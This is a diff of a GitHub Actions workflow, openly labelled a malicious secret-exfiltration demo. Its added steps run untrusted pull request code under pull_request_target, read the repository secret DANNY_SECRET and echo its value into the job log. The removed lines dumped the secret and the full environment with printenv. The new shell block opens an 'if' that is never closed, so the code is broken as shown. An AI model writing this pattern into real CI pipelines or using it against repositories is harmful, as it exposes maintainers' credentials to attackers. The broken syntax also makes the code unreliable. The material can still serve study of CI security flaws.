@@ -1,22 +1,28 @@
-name: CI Demo Workflow (Modified by Attacker)
+name: Malicious PR Workflow - Secret Exfiltration Demo
 
 on:
   pull_request_target:
     types: [opened, synchronize, reopened]
 
 jobs:
-  build:
+  steal_secret_job:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
+      - name: Checkout code from PR (Attacker's Code)
         uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
 
-      - name: Malicious Step - Exfiltrate Secret
+      - name: Exfiltrate DANNY_SECRET
         env:
-          LEAKED_SECRET: ${{ secrets.DANNY_SECRET }}
+          # This makes the secret available as an environment variable to the script
+          LEAKED_DANNY_SECRET: ${{ secrets.DANNY_SECRET }}
         run: |
-          echo "Attempting to exfiltrate the secret..."
-          echo ${LEAKED_SECRET}
-          TEST_ENV=$(printenv LEAKED_SECRET)
-          printenv
-          echo ${TEST_ENV}
+          echo "Malicious workflow step running in pull_request_target context!"
+          echo "Attempting to access and exfiltrate DANNY_SECRET..."
+
+          if [ -n "$LEAKED_DANNY_SECRET" ]; then
+            echo "SUCCESS! DANNY_SECRET has been accessed."
+            echo "Value of DANNY_SECRET: $LEAKED_DANNY_SECRET"
+          
+          echo "Malicious step finished."
